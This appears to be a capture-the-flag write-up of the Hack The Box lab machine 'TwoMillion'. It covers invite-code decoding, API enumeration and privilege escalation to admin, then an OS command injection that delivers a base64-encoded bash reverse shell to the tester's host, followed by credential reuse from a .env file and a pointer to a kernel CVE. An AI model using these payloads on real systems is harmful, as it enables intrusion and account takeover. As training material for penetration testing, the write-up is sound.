
<font color="red">=======================================================================</font>
# Initial Information<font color="red">:</font> 
<font color="red">=======================================================================</font>

Name | IP Address | Tech Stack | Web Server | DB
-- | -- | -- | -- | --
TwoMillion | 10.10.11.221 | -- | -- | --

<hr>

### Loot - Credentials<font color="red">:</font> 

**User** | **Password** | **System**
-- | -- | --
admin | SuperDuperPass123 | System

<hr>

<font color="red">=======================================================================</font>
# Enumeration
<font color="red">=======================================================================</font>

##### <font color="red">[+]</font> SERVICES<font color="red">:</font> 
- HTTP - <font color="red">80</font> (HTB Platform Website)
	- /js Found `inviteapi.min.js` which contains js obfuscated. Used online tool http://www.jsnice.org/ which reveals below function to create invite code. 
		- The response provides encrypted result (`ROT13`) which reveals following msg `In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate`. When posted, it gives a `base64` code which works for registration.
			- Base 64: `ME1GSlQtSERHRlEtWEwzS04tNjQyREI=` --> 0MFJT-HDGFQ-XL3KN-642DB
```js
// Function
function makeInviteCode() {
  $.ajax({
    type : "POST",
    dataType : "json",
    url : "/api/v1/invite/how/to/generate",
    success : function(response) {
      console.log(response);
    },
    error : function(response) {
      console.log(response);
    }
  });
}
```

```JSON
{
	"0":200,
	"success":1,
	"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr",
	"enctype":"ROT13"},
	"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```
- When registered
	- Found at `/changelog`some security issues that were fixed.
	- `curl 2million.htb/api/v1 --cookie "PHPSESSID=1isgtg06qvhebftbvvdj825m1e"`reveals below endpoints
```JSON
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}

```
- `/api/v1/user/auth` endpoints show my user is **not** admin
- `/api/v1/admin/settings/update` requires the right `Content-Type` and `parameters` to be able to update my user's permissions to admin.
```bash
curl -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=1isgtg06qvhebftbvvdj825m1e" --header "Content-Type: application/json" --data '{"email": "platassec@htb.com", "is_admin":1}'
```
- Once my user is admin, by generating new VPNs at `/api/v1/admin/vpn/generate` I find the `username` parameter is vulnerable to OS Command injection --> `username=;id;`. Payload para reverse shell:
	- `curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=1isgtg06qvhebftbvvdj825m1e" --header "Content-Type: application/json" --data '{"username": "test; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjgvNDQ0NCAwPiYxCg== | base64 -d |  bash"}' -sv`
##### <font color="red">[+]</font> NMAP<font color="red">:</font> 

List all ports.
```bash
## Command:
sudo nmap $IP -p- -sS --min-rate 5000 -Pn -n -v

## Results:
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

List services and run scripts on identified open ports.
```bash 
## Command:
nmap $IP -p XXX -sCV -oN enum/nmap -v

## Results:
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```


<hr>

##### <font color="red">[+]</font> WFUZZ

###### FILES: <font color="red">/</font>(Web Root)
```bash
wfuzz -c --hc 404 --hh 0 -u http://$IP/FUZZ  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 200

# Results:
=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================
- Nothing interesting
```

###### DIRECTORIES: <font color="red">/</font>(Web Root)
```bash
# Command:
wfuzz -c --hc 404 --hh 0 -u http://$IP/FUZZ  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 200

Results:
=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================
- Nothing interesting
```

<hr>

<font color="red">=======================================================================</font>
# Post Exploitation
<font color="red">=======================================================================</font>

##### <font color="red">[+]</font> PrivEsc Notes<font color="red">:</font> 
- `/var/www/html` contains `.env` with DB credentials which are reused for `admin` user
```bash
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```
- `123` folder under `admin` directory ¿?
- `/var/mail/admin `reveals email with potential kernel vulnerability
		*From: ch4p <ch4p@2million.htb>
		To: admin <admin@2million.htb>
		Cc: g0blin <g0blin@2million.htb>
		Subject: Urgent: Patch System OS
		Date: Tue, 1 June 2023 10:45:22 -0700
		Message-ID: <9876543210@2million.htb>
		X-Mailer: ThunderMail Pro 5.2
```bash		
Hey admin,
		
I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
		
HTB Godfather
```
- Vulnerable to <font color="red">CVE-2023-0386</font> as the system **version** `5.15.70-051570-generic` is (by running `uname -r`)
##### <font color="red">[+]</font> System Enumeration<font color="red">:</font> 

- **Host**:
	DISTRIB_ID=Ubuntu
	DISTRIB_RELEASE=22.04
	DISTRIB_CODENAME=jammy
	DISTRIB_DESCRIPTION="Ubuntu 22.04.2 LTS"
	PRETTY_NAME="Ubuntu 22.04.2 LTS"
	NAME="Ubuntu"
	VERSION_ID="22.04"
	VERSION="22.04.2 LTS (Jammy Jellyfish)"
	VERSION_CODENAME=jammy
	UBUNTU_CODENAME=jammy
- **Compilation version and architecture**: 64-bit LSB, x86-64
##### <font color="red">[+]</font> List Interesting Directories<font color="red">:</font> 

- **/tmp**: - 
- **/opt**: -
- **/var/tmp**: -
- **/dev/shm**: -
- **/var/backups/**: -
- **/var/mail**: -
